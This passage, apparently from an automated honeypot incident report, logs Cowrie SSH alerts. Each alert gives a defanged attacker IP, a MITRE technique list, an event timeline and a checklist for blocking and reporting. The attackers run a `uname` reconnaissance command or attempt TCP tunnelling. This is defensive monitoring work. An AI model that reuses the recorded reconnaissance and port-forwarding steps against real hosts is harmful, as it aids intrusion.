| **Last Seen** | 2026-08-30 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:22:13` | `cowrie.session.connect` |
| `2026-08-30 14:22:13` | `cowrie.client.version` |
| `2026-08-30 14:22:13` | `cowrie.client.kex` |
| `2026-08-30 14:22:13` | `cowrie.login.success` |
| `2026-08-30 14:22:14` | `cowrie.session.params` |
| `2026-08-30 14:22:14` | `cowrie.command.input` |
| `2026-08-30 14:22:14` | `cowrie.log.closed` |
| `2026-08-30 14:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acdfbf07a273

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:24 |
| **Last Seen** | 2026-08-30 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:24:41` | `cowrie.session.connect` |
| `2026-08-30 14:24:41` | `cowrie.client.version` |
| `2026-08-30 14:24:42` | `cowrie.client.kex` |
| `2026-08-30 14:24:42` | `cowrie.login.success` |
| `2026-08-30 14:24:43` | `cowrie.session.params` |
| `2026-08-30 14:24:43` | `cowrie.command.input` |
| `2026-08-30 14:24:43` | `cowrie.log.closed` |
| `2026-08-30 14:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7685d0cfcd8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:25 |
| **Last Seen** | 2026-08-30 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:25:53` | `cowrie.session.connect` |
| `2026-08-30 14:25:53` | `cowrie.client.version` |
| `2026-08-30 14:25:53` | `cowrie.client.kex` |
| `2026-08-30 14:25:54` | `cowrie.login.success` |
| `2026-08-30 14:25:54` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:25:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:25:54` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e387b6155fdb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:27 |
| **Last Seen** | 2026-08-30 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:27:12` | `cowrie.session.connect` |
| `2026-08-30 14:27:12` | `cowrie.client.version` |
| `2026-08-30 14:27:12` | `cowrie.client.kex` |
| `2026-08-30 14:27:12` | `cowrie.login.success` |
| `2026-08-30 14:27:13` | `cowrie.session.params` |
| `2026-08-30 14:27:13` | `cowrie.command.input` |
| `2026-08-30 14:27:13` | `cowrie.log.closed` |
| `2026-08-30 14:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541d546767eb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:29 |
| **Last Seen** | 2026-08-30 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:29:51` | `cowrie.session.connect` |
| `2026-08-30 14:29:51` | `cowrie.client.version` |
| `2026-08-30 14:29:51` | `cowrie.client.kex` |
| `2026-08-30 14:29:51` | `cowrie.login.success` |
| `2026-08-30 14:29:52` | `cowrie.session.params` |
| `2026-08-30 14:29:52` | `cowrie.command.input` |
| `2026-08-30 14:29:52` | `cowrie.log.closed` |
| `2026-08-30 14:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a30360b1be

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-08-30 14:29 |
| **Last Seen** | 2026-08-30 14:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:29:55` | `cowrie.session.connect` |
| `2026-08-30 14:29:56` | `cowrie.client.version` |
| `2026-08-30 14:29:56` | `cowrie.client.kex` |
| `2026-08-30 14:29:59` | `cowrie.login.success` |
| `2026-08-30 14:30:00` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03f30afcca2

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]23` |
| **First Seen** | 2026-08-30 14:30 |
| **Last Seen** | 2026-08-30 14:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:30:05` | `cowrie.session.connect` |
| `2026-08-30 14:30:06` | `cowrie.client.version` |
| `2026-08-30 14:30:06` | `cowrie.client.kex` |
| `2026-08-30 14:30:09` | `cowrie.login.success` |
| `2026-08-30 14:30:10` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]23` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-012799278b9a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:31 |
| **Last Seen** | 2026-08-30 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:31:52` | `cowrie.session.connect` |
| `2026-08-30 14:31:52` | `cowrie.client.version` |
| `2026-08-30 14:31:52` | `cowrie.client.kex` |
| `2026-08-30 14:31:53` | `cowrie.login.success` |
| `2026-08-30 14:31:53` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:31:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:31:53` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c54d7fe62168

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:32 |
| **Last Seen** | 2026-08-30 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:32:24` | `cowrie.session.connect` |
| `2026-08-30 14:32:24` | `cowrie.client.version` |
| `2026-08-30 14:32:24` | `cowrie.client.kex` |
| `2026-08-30 14:32:24` | `cowrie.login.success` |
| `2026-08-30 14:32:25` | `cowrie.session.params` |
| `2026-08-30 14:32:25` | `cowrie.command.input` |
| `2026-08-30 14:32:25` | `cowrie.log.closed` |
| `2026-08-30 14:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f125857777c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:33 |
| **Last Seen** | 2026-08-30 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:33:18` | `cowrie.session.connect` |
| `2026-08-30 14:33:18` | `cowrie.client.version` |
| `2026-08-30 14:33:19` | `cowrie.client.kex` |
| `2026-08-30 14:33:19` | `cowrie.login.success` |
| `2026-08-30 14:33:20` | `cowrie.session.params` |
| `2026-08-30 14:33:20` | `cowrie.command.input` |
| `2026-08-30 14:33:20` | `cowrie.log.closed` |
| `2026-08-30 14:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0eeb60c199

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:35 |
| **Last Seen** | 2026-08-30 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:35:00` | `cowrie.session.connect` |
| `2026-08-30 14:35:00` | `cowrie.client.version` |
| `2026-08-30 14:35:00` | `cowrie.client.kex` |
| `2026-08-30 14:35:00` | `cowrie.login.success` |
| `2026-08-30 14:35:01` | `cowrie.session.params` |
| `2026-08-30 14:35:01` | `cowrie.command.input` |
| `2026-08-30 14:35:01` | `cowrie.log.closed` |
| `2026-08-30 14:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c93efab971df

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:35 |
| **Last Seen** | 2026-08-30 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:35:11` | `cowrie.session.connect` |
| `2026-08-30 14:35:11` | `cowrie.client.version` |
| `2026-08-30 14:35:11` | `cowrie.client.kex` |
| `2026-08-30 14:35:12` | `cowrie.login.success` |
| `2026-08-30 14:35:12` | `cowrie.session.params` |
| `2026-08-30 14:35:12` | `cowrie.command.input` |
| `2026-08-30 14:35:13` | `cowrie.log.closed` |
| `2026-08-30 14:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edad7030cdab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:35 |
| **Last Seen** | 2026-08-30 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:35:23` | `cowrie.session.connect` |
| `2026-08-30 14:35:23` | `cowrie.client.version` |
| `2026-08-30 14:35:24` | `cowrie.client.kex` |
| `2026-08-30 14:35:24` | `cowrie.login.success` |
| `2026-08-30 14:35:25` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:35:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:35:25` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f9db89b07ad

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:37 |
| **Last Seen** | 2026-08-30 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:37:00` | `cowrie.session.connect` |
| `2026-08-30 14:37:00` | `cowrie.client.version` |
| `2026-08-30 14:37:00` | `cowrie.client.kex` |
| `2026-08-30 14:37:00` | `cowrie.login.success` |
| `2026-08-30 14:37:01` | `cowrie.session.params` |
| `2026-08-30 14:37:01` | `cowrie.command.input` |
| `2026-08-30 14:37:01` | `cowrie.log.closed` |
| `2026-08-30 14:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c7d195e015a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:37 |
| **Last Seen** | 2026-08-30 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:37:30` | `cowrie.session.connect` |
| `2026-08-30 14:37:30` | `cowrie.client.version` |
| `2026-08-30 14:37:30` | `cowrie.client.kex` |
| `2026-08-30 14:37:30` | `cowrie.login.success` |
| `2026-08-30 14:37:31` | `cowrie.session.params` |
| `2026-08-30 14:37:31` | `cowrie.command.input` |
| `2026-08-30 14:37:31` | `cowrie.log.closed` |
| `2026-08-30 14:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3feddced1773

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-08-30 14:37 |
| **Last Seen** | 2026-08-30 14:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:37:57` | `cowrie.session.connect` |
| `2026-08-30 14:37:58` | `cowrie.client.version` |
| `2026-08-30 14:37:58` | `cowrie.client.kex` |
| `2026-08-30 14:38:00` | `cowrie.login.success` |
| `2026-08-30 14:38:01` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d21d1c53eb9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:38 |
| **Last Seen** | 2026-08-30 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:38:46` | `cowrie.session.connect` |
| `2026-08-30 14:38:46` | `cowrie.client.version` |
| `2026-08-30 14:38:46` | `cowrie.client.kex` |
| `2026-08-30 14:38:47` | `cowrie.login.success` |
| `2026-08-30 14:38:48` | `cowrie.session.params` |
| `2026-08-30 14:38:48` | `cowrie.command.input` |
| `2026-08-30 14:38:48` | `cowrie.log.closed` |
| `2026-08-30 14:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c75624a3bc82

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-08-30 14:39 |
| **Last Seen** | 2026-08-30 14:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:39:47` | `cowrie.session.connect` |
| `2026-08-30 14:39:48` | `cowrie.client.version` |
| `2026-08-30 14:39:48` | `cowrie.client.kex` |
| `2026-08-30 14:39:49` | `cowrie.login.success` |
| `2026-08-30 14:39:50` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5763c5f941a

| Field | Detail |
|---|---|
| **Source IP** | `60.214.127[.]246` |
| **First Seen** | 2026-08-30 14:39 |
| **Last Seen** | 2026-08-30 14:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:39:55` | `cowrie.session.connect` |
| `2026-08-30 14:39:56` | `cowrie.client.version` |
| `2026-08-30 14:39:56` | `cowrie.client.kex` |
| `2026-08-30 14:39:59` | `cowrie.login.success` |
| `2026-08-30 14:40:00` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.214.127[.]246` to AbuseIPDB if not already reported
- [ ] Block `60.214.127[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d407fb2254d9

| Field | Detail |
|---|---|
| **Source IP** | `171.8.42[.]112` |
| **First Seen** | 2026-08-30 14:39 |
| **Last Seen** | 2026-08-30 14:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:39:55` | `cowrie.session.connect` |
| `2026-08-30 14:39:56` | `cowrie.client.version` |
| `2026-08-30 14:39:56` | `cowrie.client.kex` |
| `2026-08-30 14:40:00` | `cowrie.login.success` |
| `2026-08-30 14:40:00` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.42[.]112` to AbuseIPDB if not already reported
- [ ] Block `171.8.42[.]112` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2136cd56cdd3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:40 |
| **Last Seen** | 2026-08-30 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:40:01` | `cowrie.session.connect` |
| `2026-08-30 14:40:01` | `cowrie.client.version` |
| `2026-08-30 14:40:01` | `cowrie.client.kex` |
| `2026-08-30 14:40:01` | `cowrie.login.success` |
| `2026-08-30 14:40:02` | `cowrie.session.params` |
| `2026-08-30 14:40:02` | `cowrie.command.input` |
| `2026-08-30 14:40:02` | `cowrie.log.closed` |
| `2026-08-30 14:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a50c68f774f

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-08-30 14:40 |
| **Last Seen** | 2026-08-30 14:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:40:06` | `cowrie.session.connect` |
| `2026-08-30 14:40:07` | `cowrie.client.version` |
| `2026-08-30 14:40:07` | `cowrie.client.kex` |
| `2026-08-30 14:40:09` | `cowrie.login.success` |
| `2026-08-30 14:40:10` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a229f8cd87

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:40 |
| **Last Seen** | 2026-08-30 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:40:29` | `cowrie.session.connect` |
| `2026-08-30 14:40:29` | `cowrie.client.version` |
| `2026-08-30 14:40:29` | `cowrie.client.kex` |
| `2026-08-30 14:40:29` | `cowrie.login.success` |
| `2026-08-30 14:40:30` | `cowrie.session.params` |
| `2026-08-30 14:40:30` | `cowrie.command.input` |
| `2026-08-30 14:40:30` | `cowrie.log.closed` |
| `2026-08-30 14:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ecc514f2195

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-30 14:42 |
| **Last Seen** | 2026-08-30 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:42:13` | `cowrie.session.connect` |
| `2026-08-30 14:42:13` | `cowrie.client.version` |
| `2026-08-30 14:42:13` | `cowrie.client.kex` |
| `2026-08-30 14:42:13` | `cowrie.login.success` |
| `2026-08-30 14:42:14` | `cowrie.session.params` |
| `2026-08-30 14:42:14` | `cowrie.command.input` |
| `2026-08-30 14:42:14` | `cowrie.log.closed` |
| `2026-08-30 14:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d895d14ee0ff

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:42 |
| **Last Seen** | 2026-08-30 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:42:38` | `cowrie.session.connect` |
| `2026-08-30 14:42:38` | `cowrie.client.version` |
| `2026-08-30 14:42:38` | `cowrie.client.kex` |
| `2026-08-30 14:42:38` | `cowrie.login.success` |
| `2026-08-30 14:42:39` | `cowrie.session.params` |
| `2026-08-30 14:42:39` | `cowrie.command.input` |
| `2026-08-30 14:42:39` | `cowrie.log.closed` |
| `2026-08-30 14:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5acfc9fb2cb6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:42 |
| **Last Seen** | 2026-08-30 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
